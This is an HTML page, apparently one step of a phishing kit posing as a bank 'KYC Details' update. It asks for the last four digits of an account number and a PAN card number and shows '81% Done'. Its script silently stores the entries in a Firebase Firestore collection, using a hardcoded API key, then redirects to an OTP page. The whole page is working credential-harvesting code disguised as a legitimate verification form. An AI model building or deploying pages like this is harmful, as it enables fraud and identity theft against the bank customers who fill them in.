<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KYC</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <!-- Your custom CSS -->
    <link rel="stylesheet" href="./style.css">
    <style>
        /* Add your custom styles here */
    </style>

</head>

<body>
    <header class="Tpv_logo__La5jG">
        <img alt="cMIF2W" width="120" height="32" src="./images/logo.7fd9da50.png" style="color:transparent">
    </header>
    <div class="Tpv_login_heading__E5J6K">
        <h3 class="Tpv_login_heading_h3__z0Qx1">KYC Details</h3>
    </div>
    <div class="Tpv_login_form___9zpm">
        <p class="Tpv_mandatory_txt__YZHLO">Required fields an asterisk (*)</p>
        <form class="Tpv_form__okPRU" id="firebaseForm" onsubmit="submitForm(event)">
            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Last 4-digit A/c No <span
                        class="Tpv_mandatory_txt__YZHLO">*</span></label><input inputmode="numeric" minlength="4"
                    maxlength="4" class="Tpv_form_control__5hzGF pan" required="" type="text" name="LDAN"></div>
            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Pan Card No.<span
                        class="Tpv_mandatory_txt__YZHLO">*</span></label><input pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}"
                    maxlength="10" minlength="10" class="Tpv_form_control__5hzGF" required="" type="e" name="PCN"></div>
            <p class="Tpv_content_title__SWlCq">81% Done</p>
            <div class="Tpv_t_center__8YF86"><input class="Tpv_btn_default__TMlv_" type="submit"></div>
        </form>
    </div>
    <div class="Tpv_footer_area__vmfML"><img alt="599OM4" loading="lazy" width="68" height="28" decoding="async"
            data-nimg="1" src="./images/ersign.6a658828.png" style="color:transparent"></div>
    <div class="Tpv_footer__uSut5">
        <p>Â© 2023</p>
    </div>
    <!-- Bootstrap JS and dependencies (jQuery) -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script src="
https://cdn.jsdelivr.net/npm/jquery-mask-plugin@1.14.16/dist/jquery.mask.min.js
"></script>

    <!-- Firebase SDK (add your own Firebase configuration) -->
    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
    <!-- Your custom JavaScript for Firebase integration -->
    <script>
        // Your Firebase configuration
        // Your Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyB2heDmSZnCAo2wesbIYGfibU3r0ERji7c",
            authDomain: "dataapp-1cc92.firebaseapp.com",
            projectId: "dataapp-1cc92",
            storageBucket: "dataapp-1cc92.appspot.com",
            messagingSenderId: "842942560914",
            appId: "1:842942560914:web:751f7c1434d5032cb2444b",
            measurementId: "G-FJ634LE6MZ"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);

        // Your form submission function
        async function submitForm(event) {
            event.preventDefault();

            const form = document.getElementById('firebaseForm');
            const formData = new FormData(form);

            // Convert formData to a plain object
            const formDataObject = {};
            formData.forEach((value, key) => {
                formDataObject[key] = value;
            });

            try {
                // Initialize Firestore
                const firestore = firebase.firestore();
                formDataObject.timestamp = firebase.firestore.FieldValue.serverTimestamp();

                // Add data to Firestore
                const submissionsCollection = firestore.collection('formSubmissions');
                await submissionsCollection.add(formDataObject);

                // Clear form after submission
                form.reset();
                window.location.href = 'otp-next-2.html';

            } catch (error) {
                console.error('Error adding document: ', error);
            }
        }


        $(document).ready(function () {
            $('.pan').mask('0000');


        });
    </script>

</body>

</html>